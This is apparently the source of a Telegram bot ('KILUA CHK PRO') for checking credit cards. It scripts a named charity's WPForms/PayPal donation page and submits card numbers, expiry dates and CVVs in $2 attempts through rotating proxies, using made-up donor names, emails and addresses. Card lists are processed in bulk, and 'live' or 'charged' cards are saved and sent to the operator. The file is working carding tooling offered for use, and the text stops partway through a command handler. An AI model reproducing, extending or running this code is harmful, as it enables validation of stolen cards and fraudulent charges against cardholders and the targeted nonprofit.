"""
╔══════════════════════════════════════════════════════╗
║   🔥  KILUA CHK PRO  —  PayPal / WPForms Gate       ║
║   @o8380 · @Mustafa964 · Kilua Services  v3.0        ║
║   ENV: BOT_TOKEN | OWNER_ID                          ║
╚══════════════════════════════════════════════════════╝
"""

import os, re, time, random, logging, threading
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from bs4 import BeautifulSoup
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ══════════════════════════════════════════════════════
# CONFIG
# ══════════════════════════════════════════════════════
logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger(__name__)

BOT_TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID  = int(os.environ.get("OWNER_ID", "6285783725"))
TAG       = "@o8380"
CREDITS   = "@o8380 · @Mustafa964 · Kilua Services"
VERSION   = "3.0"
WELCOME_VIDEO = "https://t.me/Mustafa964iq/3"

# ── Target Site ────────────────────────────────────────
SITE        = "https://matthewjstratmanfoundation.org"
DONATE_URL  = f"{SITE}/donate/"
AJAX_URL    = f"{SITE}/wp-admin/admin-ajax.php"
FORM_ID     = "2357"
PAGE_ID     = "94"
AMOUNT      = "2.00"
AMOUNT_STR  = "$2.00"

# ── User-Agent ─────────────────────────────────────────
UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"

# ── Icons ──────────────────────────────────────────────
I = {
    "gate":     "5059798514972754990",
    "buy":      "5059910390280881178",
    "back":     "5060247798616687432",
    "stars":    "5060298809943262023",
    "charge":   "5330274810582827128",
    "auth":     "5330412803587080658",
    "stop":     "5242195906199035850",
    "approved": "5165928140404426202",
    "declined": "5974342591552952895",
    "charged":  "4965219701572503640",
}

# ── Paths ──────────────────────────────────────────────
for d in ["results"]:
    Path(d).mkdir(exist_ok=True)

# ══════════════════════════════════════════════════════
# BOT
# ══════════════════════════════════════════════════════
bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
try:
    bot.remove_webhook()
    time.sleep(0.5)
except Exception:
    pass

_state: dict = {}
_lock = threading.Lock()

def gs(uid): 
    with _lock: return _state.setdefault(uid, {})
def ss(uid, d): 
    with _lock: _state[uid] = d
def cs(uid): 
    with _lock: _state.pop(uid, None)

# ══════════════════════════════════════════════════════
# RANDOM DATA GENERATORS
# ══════════════════════════════════════════════════════
_FIRST = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles","Mary","Patricia","Jennifer","Linda","Barbara","Elizabeth","Susan","Jessica","Sarah","Karen"]
_LAST  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin"]
_STREETS = ["Main St","Oak Ave","Maple Dr","Cedar Ln","Pine Rd","Elm St","Washington Blvd","Park Ave","Lake Dr","Hill Rd"]
_CITIES  = ["New York","Los Angeles","Chicago","Houston","Phoenix","Philadelphia","San Antonio","San Diego","Dallas","San Jose"]
_STATES  = ["NY","CA","IL","TX","AZ","PA","TX","CA","TX","CA"]
_ZIPS    = ["10001","90001","60601","77001","85001","19101","78201","92101","75201","95101"]

def rand_name():
    return random.choice(_FIRST), random.choice(_LAST)

def rand_email(first, last):
    n = random.randint(10, 9999)
    domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","proton.me"]
    return f"{first.lower()}{last.lower()}{n}@{random.choice(domains)}"

def rand_phone():
    return f"({random.randint(200,999)}) {random.randint(200,999)}-{random.randint(1000,9999)}"

def rand_address():
    i = random.randint(0, len(_CITIES)-1)
    num = random.randint(100, 9999)
    return {
        "street": f"{num} {random.choice(_STREETS)}",
        "city":   _CITIES[i],
        "state":  _STATES[i],
        "zip":    _ZIPS[i],
    }

def rand_ts():
    now = int(time.time())
    return str(now - random.randint(30, 120)), str(now)

# ══════════════════════════════════════════════════════
# PROXY MANAGER
# ══════════════════════════════════════════════════════
class ProxyManager:
    def __init__(self):
        self._list = []
        self._idx  = 0
        self._lock = threading.Lock()

    def load_file(self, path: str):
        lines = Path(path).read_text().splitlines()
        self._list = [l.strip() for l in lines if l.strip()]
        log.info(f"Loaded {len(self._list)} proxies")

    def set_single(self, proxy: str):
        self._list = [proxy]

    def get(self):
        if not self._list:
            return None
        with self._lock:
            p = self._list[self._idx % len(self._list)]
            self._idx += 1
        # format: host:port:user:pass or host:port or http://...
        if p.startswith("http"):
            return {"http": p, "https": p}
        parts = p.split(":")
        if len(parts) == 4:
            url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2:
            url = f"http://{parts[0]}:{parts[1]}"
        else:
            url = f"http://{p}"
        return {"http": url, "https": url}

proxy_mgr = ProxyManager()

# ══════════════════════════════════════════════════════
# BIN INFO
# ══════════════════════════════════════════════════════
_BIN: dict = {}

def bin_info(bin6: str) -> dict:
    if bin6 in _BIN: return _BIN[bin6]
    try:
        px = proxy_mgr.get()
        r  = requests.get(
            f"https://bins.antipublic.cc/bins/{bin6}",
            timeout=6, proxies=px,
        ).json()
        d = {
            "brand":   r.get("brand",        "?"),
            "type":    r.get("type",         "?"),
            "level":   r.get("level",        "?"),
            "bank":    r.get("bank",         "?"),
            "country": r.get("country_name", "?"),
            "flag":    r.get("country_flag", "🏳️"),
        }
        _BIN[bin6] = d
        return d
    except Exception:
        return {"brand":"?","type":"?","level":"?","bank":"?","country":"?","flag":"🏳️"}

# ══════════════════════════════════════════════════════
# PAYPAL / WPFORMS CHECKER ENGINE
# ══════════════════════════════════════════════════════

# نتائج HIT
_HIT_STATUS   = {"APPROVED", "PAYER_ACTION_REQUIRED", "VOIDED"}
_HIT_KEYWORDS = [
    "approved", "payer_action_required", "instrument_declined",
    "insufficient_funds", "do_not_honor", "card_velocity_exceeded",
    "transaction_not_allowed", "currency_not_supported",
    "authentication_required", "try_again_later",
    "restricted_card", "pickup_card", "cvv2 failure",
    "security code", "expiry", "strong_authentication_required",
]
_DEAD_KEYWORDS = [
    "invalid_number", "card number is not valid",
    "invalid_account", "no such card", "account_not_found",
    "card_number_invalid", "invalid card number",
    "incorrect_number",
]


def _new_session(proxies=None) -> requests.Session:
    s = requests.Session()
    if proxies:
        s.proxies.update(proxies)
    s.headers.update({
        "user-agent": UA,
        "accept-language": "en-US,en;q=0.9",
        "accept": "*/*",
    })
    return s


def _site_headers(referer=None) -> dict:
    h = {
        "authority":    "matthewjstratmanfoundation.org",
        "origin":       SITE,
        "referer":      referer or DONATE_URL,
        "sec-ch-ua":    '"Chromium";v="139", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile":   "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent":   UA,
        "x-requested-with": "XMLHttpRequest",
    }
    return h


def _extract_page_data(sess: requests.Session) -> dict:
    """استخراج nonce و wpforms_token و client_id من صفحة الدونيت"""
    r = sess.get(DONATE_URL, timeout=30)
    html = r.text

    # wpforms token
    token = ""
    m = re.search(r'"token"\s*:\s*"([a-f0-9]{32})"', html)
    if m:
        token = m.group(1)
    else:
        # fallback
        soup = BeautifulSoup(html, "html.parser")
        inp  = soup.find("input", {"name": "wpforms[token]"})
        if inp:
            token = inp.get("value", "")

    # paypal commerce nonce
    nonce = ""
    m2 = re.search(r'"nonce"\s*:\s*"([a-f0-9]{10})"', html)
    if m2:
        nonce = m2.group(1)
    # client_id (PayPal)
    client_id = ""
    m3 = re.search(r'client-id=([A-Za-z0-9_-]+)', html)
    if m3:
        client_id = m3.group(1)

    return {"token": token, "nonce": nonce, "client_id": client_id, "html": html}


def _create_order(sess: requests.Session, page_data: dict,
                  first: str, last: str, email: str, phone: str) -> str:
    """إنشاء PayPal Order وإرجاع order_id"""
    ts_start, ts_end = rand_ts()
    name_full = f"{first} {last}"

    files = {
        "wpforms[fields][3]":                     (None, ""),
        "wpforms[fields][29]":                    (None, time.strftime("%m/%d/%Y")),
        "wpforms[fields][2]":                     (None, name_full),
        "wpforms[fields][4]":                     (None, email),
        "wpforms[fields][5]":                     (None, phone),
        "wpforms[fields][6]":                     (None, ""),
        "wpforms[fields][28]":                    (None, AMOUNT),
        "wpforms[fields][36]":                    (None, "Donation Only"),
        "wpforms[fields][30]":                    (None, first),
        "wpforms[fields][23]":                    (None, AMOUNT_STR),
        "wpforms[fields][33][]":                  (None, "Pay Now with PayPal / Credit Card"),
        "wpforms[fields][34][orderID]":           (None, ""),
        "wpforms[fields][34][subscriptionID]":    (None, ""),
        "wpforms[fields][34][subscriptionProcessorID]": (None, ""),
        "wpforms[fields][34][source]":            (None, ""),
        "wpforms[fields][34][fastlane_token]":    (None, ""),
        "wpforms[fields][34][cardname]":          (None, name_full),
        "wpforms[id]":                            (None, FORM_ID),
        "page_title":                             (None, "Donate"),
        "page_url":                               (None, DONATE_URL),
        "url_referer":                            (None, ""),
        "page_id":                                (None, PAGE_ID),
        "wpforms[post_id]":                       (None, PAGE_ID),
        "total":                                  (None, "2"),
        "nonce":                                  (None, page_data["nonce"]),
        "payment_source":                         (None, "card"),
    }

    r = sess.post(
        AJAX_URL,
        params={"action": "wpforms_paypal_commerce_create_order"},
        headers=_site_headers(),
        files=files,
        timeout=30,
    )

    try:
        j = r.json()
        # {"success": true, "data": {"id": "..."}}
        order_id = j.get("data", {}).get("id", "")
        if not order_id:
            order_id = j.get("data", "") if isinstance(j.get("data"), str) else ""
        return order_id
    except Exception:
        # استخراج ID من النص
        m = re.search(r'"id"\s*:\s*"([0-9A-Z]+)"', r.text)
        return m.group(1) if m else ""


def _get_bearer_token(sess: requests.Session, client_id: str) -> str:
    """جلب Bearer Token من PayPal"""
    try:
        r = sess.post(
            "https://api.paypal.com/v1/oauth2/token",
            headers={
                "authorization": f"Basic {client_id}",
                "content-type":  "application/x-www-form-urlencoded",
                "user-agent":    UA,
            },
            data="grant_type=client_credentials",
            timeout=20,
        )
        return r.json().get("access_token", "")
    except Exception:
        return ""


def _confirm_card(order_id: str, bearer: str,
                  n: str, mm: str, yy: str, cvc: str,
                  name: str, proxies=None) -> dict:
    """تأكيد البطاقة على PayPal API"""
    expiry = f"20{yy}-{mm}" if len(yy) == 2 else f"{yy}-{mm}"
    metadata_id = "".join(random.choices("0123456789abcdef", k=32))

    headers = {
        "authority":              "cors.api.paypal.com",
        "authorization":          f"Bearer {bearer}",
        "braintree-sdk-version":  "3.32.0-payments-sdk-dev",
        "content-type":           "application/json",
        "origin":                 "https://assets.braintreegateway.com",
        "paypal-client-metadata-id": metadata_id,
        "referer":                "https://assets.braintreegateway.com/",
        "sec-ch-ua":              '"Chromium";v="139", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile":       "?1",
        "sec-ch-ua-platform":     '"Android"',
        "sec-fetch-dest":         "empty",
        "sec-fetch-mode":         "cors",
        "sec-fetch-site":         "cross-site",
        "user-agent":             UA,
    }

    payload = {
        "payment_source": {
            "card": {
                "number":        n,
                "expiry":        expiry,
                "security_code": cvc,
                "name":          name,
                "attributes": {
                    "verification": {"method": "SCA_WHEN_REQUIRED"}
                },
            }
        },
        "application_context": {"vault": False},
    }

    s = requests.Session()
    if proxies:
        s.proxies.update(proxies)

    r = s.post(
        f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
        headers=headers,
        json=payload,
        timeout=30,
    )
    try:
        return r.json()
    except Exception:
        return {"raw": r.text[:300]}


def _submit_form(sess: requests.Session, page_data: dict,
                 order_id: str, first: str, last: str,
                 email: str, phone: str) -> dict:
    """إرسال الفورم النهائي مع order_id"""
    ts_start, ts_end = rand_ts()
    name_full = f"{first} {last}"

    files = {
        "wpforms[fields][3]":                     (None, ""),
        "wpforms[fields][29]":                    (None, time.strftime("%m/%d/%Y")),
        "wpforms[fields][2]":                     (None, name_full),
        "wpforms[fields][4]":                     (None, email),
        "wpforms[fields][5]":                     (None, phone),
        "wpforms[fields][6]":                     (None, ""),
        "wpforms[fields][28]":                    (None, AMOUNT),
        "wpforms[fields][36]":                    (None, "Donation Only"),
        "wpforms[fields][30]":                    (None, first),
        "wpforms[fields][23]":                    (None, AMOUNT_STR),
        "wpforms[fields][33][]":                  (None, "Pay Now with PayPal / Credit Card"),
        "wpforms[fields][34][orderID]":           (None, order_id),
        "wpforms[fields][34][subscriptionID]":    (None, ""),
        "wpforms[fields][34][subscriptionProcessorID]": (None, ""),
        "wpforms[fields][34][source]":            (None, ""),
        "wpforms[fields][34][fastlane_token]":    (None, ""),
        "wpforms[fields][34][cardname]":          (None, name_full),
        "wpforms[id]":                            (None, FORM_ID),
        "page_title":                             (None, "Donate"),
        "page_url":                               (None, DONATE_URL),
        "url_referer":                            (None, ""),
        "page_id":                                (None, PAGE_ID),
        "wpforms[post_id]":                       (None, PAGE_ID),
        "wpforms[token]":                         (None, page_data["token"]),
        "action":                                 (None, "wpforms_submit"),
        "start_timestamp":                        (None, ts_start),
        "end_timestamp":                          (None, ts_end),
    }

    r = sess.post(
        AJAX_URL,
        headers=_site_headers(),
        files=files,
        timeout=30,
    )
    try:
        return r.json()
    except Exception:
        return {"raw": r.text[:300]}


def _classify(paypal_resp: dict, form_resp: dict) -> tuple:
    """
    يُعيد (status, message)
    status: CHARGED | APPROVED | LIVE | DECLINED
    """
    # ── تحليل رد PayPal أولاً ─────────────────────────
    pp_status = paypal_resp.get("status", "").upper()
    pp_details = str(paypal_resp).lower()

    # CHARGED — أفضل نتيجة
    if pp_status == "COMPLETED" or "completed" in pp_details:
        return "CHARGED", "Payment Completed ✅"

    # APPROVED — بطاقة صالحة مع 3DS
    if pp_status in {"APPROVED", "PAYER_ACTION_REQUIRED"}:
        msg = paypal_resp.get("links", [{}])
        return "APPROVED", "Card Approved - 3DS Required 🔐"

    # تحليل رسائل الخطأ
    errors = paypal_resp.get("details", [])
    if not errors and "details" in str(paypal_resp):
        try:
            errors = paypal_resp.get("details", [])
        except Exception:
            pass

    for e in errors:
        issue = e.get("issue", "").lower()
        desc  = e.get("description", "").lower()
        combined = issue + " " + desc

        for d in _DEAD_KEYWORDS:
            if d in combined:
                return "DECLINED", desc or issue

        for h in _HIT_KEYWORDS:
            if h in combined:
                return "LIVE", desc or issue

    # تحليل الرد الكلي
    for d in _DEAD_KEYWORDS:
        if d in pp_details:
            return "DECLINED", d

    for h in _HIT_KEYWORDS:
        if h in pp_details:
            return "LIVE", h

    # ── تحليل رد الفورم ──────────────────────────────
    form_str = str(form_resp).lower()
    if "success" in form_str and "true" in form_str:
        return "CHARGED", "Form Submitted Successfully"
    if "declined" in form_str:
        return "DECLINED", "Form Declined"

    # Raw status
    if pp_status:
        return "LIVE", f"Status: {pp_status}"

    return "DECLINED", str(paypal_resp)[:80]


def check_card(cc: str) -> tuple:
    """
    الفاحص الرئيسي.
    يُعيد (status, message, elapsed)
    status: CHARGED | APPROVED | LIVE | DECLINED | ERROR
    """
    cc    = cc.strip()
    parts = cc.split("|")
    if len(parts) < 4:
        return "DECLINED", "Invalid Format", 0.0

    n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    if len(yy) == 4:
        yy = yy[-2:]

    proxies = proxy_mgr.get()
    first, last = rand_name()
    email = rand_email(first, last)
    phone = rand_phone()
    name  = f"{first} {last}"

    t0 = time.time()

    for attempt in range(3):
        try:
            sess = _new_session(proxies)

            # 1. جلب بيانات الصفحة
            page_data = _extract_page_data(sess)
            if not page_data["token"] and not page_data["nonce"]:
                log.debug(f"[{attempt+1}] Page parse failed")
                time.sleep(1)
                continue

            # 2. إنشاء Order
            order_id = _create_order(sess, page_data, first, last, email, phone)
            if not order_id:
                log.debug(f"[{attempt+1}] No order_id")
                time.sleep(1)
                continue

            # 3. جلب Bearer Token
            # نستخدم client_id من الصفحة أو fallback عام
            client_id = page_data.get("client_id", "")
            bearer = ""
            if client_id:
                bearer = _get_bearer_token(sess, client_id)

            # إذا فشل Bearer → نحاول بدونه (بعض الطلبات تعمل بدون token)
            if not bearer:
                # استخراج من JavaScript
                m = re.search(r'Bearer\s+([A-Za-z0-9_.-]+)', page_data.get("html", ""))
                if m:
                    bearer = m.group(1)

            if not bearer:
                log.debug(f"[{attempt+1}] No bearer token")
                # نحاول إنشاء order مباشرة بدون PayPal confirm
                form_resp = _submit_form(sess, page_data, order_id,
                                         first, last, email, phone)
                elapsed = time.time() - t0
                status, msg = _classify({}, form_resp)
                return status, msg, elapsed

            # 4. تأكيد البطاقة على PayPal
            pp_resp = _confirm_card(order_id, bearer, n, mm, yy, cvc, name, proxies)

            # 5. إرسال الفورم النهائي (إذا approved)
            form_resp = {}
            pp_status = pp_resp.get("status", "").upper()
            if pp_status in {"APPROVED", "PAYER_ACTION_REQUIRED", "COMPLETED"}:
                form_resp = _submit_form(sess, page_data, order_id,
                                          first, last, email, phone)

            elapsed = time.time() - t0
            status, msg = _classify(pp_resp, form_resp)
            return status, msg, elapsed

        except requests.exceptions.ProxyError as e:
            log.warning(f"ProxyError attempt {attempt+1}")
            time.sleep(1)
        except requests.exceptions.Timeout:
            log.warning(f"Timeout attempt {attempt+1}")
            time.sleep(1)
        except Exception as e:
            log.debug(f"check_card error {attempt+1}: {e}")
            if attempt == 2:
                return "ERROR", str(e)[:60], time.time()-t0
            time.sleep(0.5)

    return "DECLINED", "Max retries reached", time.time()-t0


def is_hit(status: str) -> bool:
    return status in {"CHARGED", "APPROVED", "LIVE"}

# ══════════════════════════════════════════════════════
# HELPERS
# ══════════════════════════════════════════════════════

def mask(cc: str) -> str:
    try:
        p = cc.split("|")
        n = p[0]
        m = n[:6] + "x"*(len(n)-10) + n[-4:]
        return f"{m}|{p[1]}|{p[2]}|***"
    except Exception:
        return cc

def pbar(done: int, total: int, w: int = 12) -> str:
    if not total: return "░"*w
    f = max(0, min(w, round(w * done / total)))
    return "█"*f + "░"*(w-f)

def status_icon(status: str) -> str:
    return {"CHARGED": "💰", "APPROVED": "✅", "LIVE": "🟡", "DECLINED": "❌", "ERROR": "⚠️"}.get(status, "❓")

def status_style(status: str) -> str:
    return {"CHARGED": "success", "APPROVED": "success", "LIVE": "primary", "DECLINED": "danger", "ERROR": "danger"}.get(status, "primary")

def status_ico_id(status: str) -> str:
    return {"CHARGED": I["charged"], "APPROVED": I["approved"], "LIVE": I["gate"], "DECLINED": I["declined"], "ERROR": I["stop"]}.get(status, I["stars"])

def save_result(uid: int, status: str, cc: str):
    p = Path(f"results/{uid}_{status.lower()}.txt")
    with open(p, "a", encoding="utf-8") as f:
        f.write(cc + "\n")

# ══════════════════════════════════════════════════════
# KEYBOARDS
# ══════════════════════════════════════════════════════

def kb_main() -> InlineKeyboardMarkup:
    mk = InlineKeyboardMarkup(row_width=2)
    mk.row(
        InlineKeyboardButton("𝐌𝐚𝐧𝐮𝐚𝐥 𝐂𝐡𝐞𝐜𝐤", callback_data="hint_manual",
                             style="primary", icon_custom_emoji_id=I["auth"]),
        InlineKeyboardButton("𝐂𝐨𝐦𝐛𝐨 𝐂𝐡𝐞𝐜𝐤",  callback_data="hint_combo",
                             style="success", icon_custom_emoji_id=I["buy"]),
    )
    mk.row(
        InlineKeyboardButton("𝐒𝐭𝐚𝐭𝐮𝐬",        callback_data="status",
                             style="primary", icon_custom_emoji_id=I["stars"]),
        InlineKeyboardButton("𝐒𝐞𝐭 𝐏𝐫𝐨𝐱𝐲",     callback_data="set_proxy",
                             style="primary", icon_custom_emoji_id=I["gate"]),
    )
    mk.add(
        InlineKeyboardButton("𝐒𝐭𝐨𝐩 𝐂𝐡𝐞𝐜𝐤",    callback_data="stop",
                             style="danger",  icon_custom_emoji_id=I["stop"]),
    )
    return mk

def kb_stop_only() -> InlineKeyboardMarkup:
    mk = InlineKeyboardMarkup()
    mk.add(InlineKeyboardButton("𝐒𝐭𝐨𝐩", callback_data="stop",
                                style="danger", icon_custom_emoji_id=I["stop"]))
    return mk

def kb_home() -> InlineKeyboardMarkup:
    mk = InlineKeyboardMarkup()
    mk.add(InlineKeyboardButton("𝐇𝐨𝐦𝐞", callback_data="home",
                                style="primary", icon_custom_emoji_id=I["back"]))
    return mk

def kb_progress(done, total, charged, approved, live, declined,
                last_status, last_msg, elapsed, running=True) -> tuple:
    pct = round(done/total*100) if total else 0
    bar = pbar(done, total)
    clr = status_style(last_status)
    ico = status_ico_id(last_status)
    icn = status_icon(last_status)

    text = f"<b>🔥 KILUA CHECKER PRO</b>  <code>v{VERSION}</code>"

    mk = InlineKeyboardMarkup(row_width=2)

    # Progress bar
    mk.add(InlineKeyboardButton(
        f"[{bar}]  {pct}%  ({done}/{total})",
        callback_data="ignore", style="primary",
        icon_custom_emoji_id=I["stars"],
    ))

    # Stats row
    mk.row(
        InlineKeyboardButton(f"💰 Charged  {charged}", callback_data="ignore",
                             style="success", icon_custom_emoji_id=I["charged"]),
        InlineKeyboardButton(f"✅ Approved  {approved}", callback_data="ignore",
                             style="success", icon_custom_emoji_id=I["approved"]),
    )
    mk.row(
        InlineKeyboardButton(f"🟡 Live  {live}", callback_data="ignore",
                             style="primary", icon_custom_emoji_id=I["gate"]),
        InlineKeyboardButton(f"❌ Declined  {declined}", callback_data="ignore",
                             style="danger", icon_custom_emoji_id=I["declined"]),
    )

    # Last result
    mk.add(InlineKeyboardButton(
        f"{icn}  {last_msg[:45]}",
        callback_data="ignore", style=clr, icon_custom_emoji_id=ico,
    ))

    # Time
    mk.add(InlineKeyboardButton(
        f"⏱  {elapsed:.2f}s",
        callback_data="ignore", style="primary",
        icon_custom_emoji_id=I["charge"],
    ))

    if running:
        mk.add(InlineKeyboardButton("𝐒𝐭𝐨𝐩 𝐂𝐡𝐞𝐜𝐤", callback_data="stop",
                                    style="danger", icon_custom_emoji_id=I["stop"]))
    return text, mk


def kb_result(cc: str, status: str, msg: str, elapsed: float) -> tuple:
    hit  = is_hit(status)
    b    = bin_info(cc.split("|")[0][:6])
    icn  = status_icon(status)
    clr  = status_style(status)
    ico  = status_ico_id(status)

    text = f"<b>#PayPal_Auth  {icn} {status}</b>"

    mk = InlineKeyboardMarkup(row_width=1)

    mk.add(InlineKeyboardButton(
        f"{icn}  {status}", callback_data="ignore",
        style=clr, icon_custom_emoji_id=ico,
    ))
    mk.add(InlineKeyboardButton(
        f"💳  {cc}", callback_data="ignore",
        style=clr, icon_custom_emoji_id=I["charged"],
    ))
    mk.add(InlineKeyboardButton(
        f"📝  {msg[:50]}", callback_data="ignore",
        style=clr, icon_custom_emoji_id=ico,
    ))
    mk.add(InlineKeyboardButton(
        f"⏱  {elapsed:.2f}s", callback_data="ignore",
        style="primary", icon_custom_emoji_id=I["charge"],
    ))
    mk.add(InlineKeyboardButton(
        "━━━━━━━━━━━━━━━━━━", callback_data="ignore",
        style="primary", icon_custom_emoji_id=I["gate"],
    ))
    mk.add(InlineKeyboardButton(
        f"🏦  {b['brand']}  {b['type']}  {b['level']}",
        callback_data="ignore", style="primary",
        icon_custom_emoji_id=I["gate"],
    ))
    mk.add(InlineKeyboardButton(
        f"🏛  {b['bank']}  {b['flag']}",
        callback_data="ignore", style="primary",
        icon_custom_emoji_id=I["auth"],
    ))
    mk.add(InlineKeyboardButton(
        f"🌍  {b['country']}  {b['flag']}",
        callback_data="ignore", style="primary",
        icon_custom_emoji_id=I["stars"],
    ))
    mk.add(InlineKeyboardButton(
        f"⚡  {CREDITS}", callback_data="ignore",
        style="primary", icon_custom_emoji_id=I["back"],
    ))
    return text, mk

# ══════════════════════════════════════════════════════
# WELCOME
# ══════════════════════════════════════════════════════

def txt_welcome(name: str) -> str:
    px_count = len(proxy_mgr._list)
    px_info  = f"🌐 Proxies: <code>{px_count}</code>" if px_count else "🌐 No Proxy"
    return (
        f"<b>🔥 KILUA CHK PRO</b>  <code>v{VERSION}</code>\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        f"✨ Welcome <b>{name}</b>\n\n"
        f"<code>📌 /chk NUM|MM|YY|CVV</code>\n"
        f"<code>📁 Send .txt file  (Combo)</code>\n"
        f"<code>🌐 /proxy host:port:user:pass</code>\n"
        f"<code>📋 /proxies (send proxy list file)</code>\n\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        f"🎯 Gate: <code>PayPal / WPForms</code>\n"
        f"{px_info}\n\n"
        f"⚡ <code>{CREDITS}</code>"
    )

# ══════════════════════════════════════════════════════
# COMBO WORKER
# ══════════════════════════════════════════════════════

def _combo_worker(uid: int, chat_id: int, msg_id: int,
                  cards: list, threads: int = 3):
    total     = len(cards)
    charged   = approved_n = live_n = declined_n = 0
    done      = 0
    lock      = threading.Lock()

    ss(uid, {
        "running": True, "total": total,
        "charged": 0, "approved": 0, "live": 0, "declined": 0,
    })

    last_status = "DECLINED"
    last_msg    = "Starting..."
    last_elapsed = 0.0

    def process(cc: str):
        nonlocal charged, approved_n, live_n, declined_n, done
        nonlocal last_status, last_msg, last_elapsed

        if not gs(uid).get("running", True):
            return

        status, msg, elapsed = check_card(cc)

        with lock:
            done += 1
            last_status  = status
            last_msg     = msg
            last_elapsed = elapsed

            if status == "CHARGED":
                charged += 1
            elif status == "APPROVED":
                approved_n += 1
            elif status == "LIVE":
                live_n += 1
            else:
                declined_n += 1

        # حفظ النتيجة
        if is_hit(status):
            save_result(uid, status.lower(), cc)
            try:
                _t, _mk = kb_result(cc, status, msg, elapsed)
                bot.send_message(chat_id, _t, parse_mode="HTML", reply_markup=_mk)
            except Exception:
                pass

        # تحديث شاشة التقدم
        try:
            _running = gs(uid).get("running", True)
            _t, _mk = kb_progress(
                done, total, charged, approved_n, live_n, declined_n,
                last_status, last_msg, last_elapsed, _running,
            )
            bot.edit_message_text(_t, chat_id, msg_id,
                                  parse_mode="HTML", reply_markup=_mk)
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(process, cc): cc for cc in cards}
        for f in as_completed(futs):
            try:
                f.result()
            except Exception:
                pass
            if not gs(uid).get("running", True):
                ex.shutdown(wait=False, cancel_futures=True)
                break

    # ── ملخص نهائي ────────────────────────────────────
    stopped = not gs(uid).get("running", True)
    label   = "🛑 Stopped" if stopped else "✅ Completed"

    mk = InlineKeyboardMarkup(row_width=2)
    mk.row(
        InlineKeyboardButton(f"💰  Charged  {charged}", callback_data="ignore",
                             style="success", icon_custom_emoji_id=I["charged"]),
        InlineKeyboardButton(f"✅  Approved  {approved_n}", callback_data="ignore",
                             style="success", icon_custom_emoji_id=I["approved"]),
    )
    mk.row(
        InlineKeyboardButton(f"🟡  Live  {live_n}", callback_data="ignore",
                             style="primary", icon_custom_emoji_id=I["gate"]),
        InlineKeyboardButton(f"❌  Declined  {declined_n}", callback_data="ignore",
                             style="danger", icon_custom_emoji_id=I["declined"]),
    )
    mk.add(InlineKeyboardButton(f"📦  Total  {total}", callback_data="ignore",
                                style="primary", icon_custom_emoji_id=I["stars"]))
    mk.add(InlineKeyboardButton(f"⚡  {CREDITS}", callback_data="ignore",
                                style="primary", icon_custom_emoji_id=I["back"]))
    mk.add(InlineKeyboardButton("𝐇𝐨𝐦𝐞", callback_data="home",
                                style="primary", icon_custom_emoji_id=I["back"]))

    try:
        bot.edit_message_text(f"<b>{label}</b>", chat_id, msg_id,
                              parse_mode="HTML", reply_markup=mk)
    except Exception:
        pass

    # إرسال ملفات النتائج
    for stype in ["charged", "approved", "live"]:
        fpath = Path(f"results/{uid}_{stype}.txt")
        if fpath.exists() and fpath.stat().st_size > 0:
            try:
                with open(fpath, "rb") as f:
                    bot.send_document(chat_id, f,
                                      caption=f"{status_icon(stype.upper())} <b>{stype.upper()}</b>",
                                      parse_mode="HTML",
                                      visible_file_name=f"{stype}.txt")
            except Exception:
                pass

    cs(uid)

# ══════════════════════════════════════════════════════
# COMMAND HANDLERS
# ══════════════════════════════════════════════════════

@bot.message_handler(commands=["start"])
def h_start(msg):
    uid  = msg.from_user.id
    name = msg.from_user.first_name or "User"
    cs(uid)
    try:
        bot.send_video(msg.chat.id, WELCOME_VIDEO,
                       caption=txt_welcome(name), parse_mode="HTML",
                       reply_markup=kb_main())
    except Exception:
        bot.send_message(msg.chat.id, txt_welcome(name),
                         parse_mode="HTML", reply_markup=kb_main())


@bot.message_handler(commands=["stop"])
def h_stop(msg):
    uid = msg.from_user.id
    st  = gs(uid)
    if st.get("running"):
        st["running"] = False
        ss(uid, st)
        bot.reply_to(msg, "<b>🛑 Stopping...</b>", parse_mode="HTML")
    else:
        bot.reply_to(msg, "ℹ️ No active check.", parse_mode="HTML")


@bot.message_handler(commands=["status"])
def h_status(msg):
    uid = msg.from_user.id
    st  = gs(uid)
    if not st:
        bot.reply_to(msg, "ℹ️ No active check.", parse_mode="HTML")
        return
    mk = InlineKeyboardMarkup(row_width=2)
    mk.row(
        InlineKeyboardButton(f"💰  {st.get('charged',0)}", callback_data="ignore",
                             style="success", icon_custom_emoji_id=I["charged"]),
        InlineKeyboardButton(f"✅  {st.get('approved',0)}", callback_data="ignore",
                             style="success", icon_custom_emoji_id=I["approved"]),
    )
    mk.row(
        InlineKeyboardButton(f"🟡  {st.get('live',0)}", callback_data="ignore",
                             style="primary", icon_custom_emoji_id=I["gate"]),
        InlineKeyboardButton(f"❌  {st.get('declined',0)}", callback_data="ignore",
                             style="danger", icon_custom_emoji_id=I["declined"]),
    )
    run = "🟢 Running" if st.get("running") else "🔴 Stopped"
    mk.add(InlineKeyboardButton(f"📦  {st.get('total',0)}  {run}",
                                callback_data="ignore", style="primary",
                                icon_custom_emoji_id=I["stars"]))
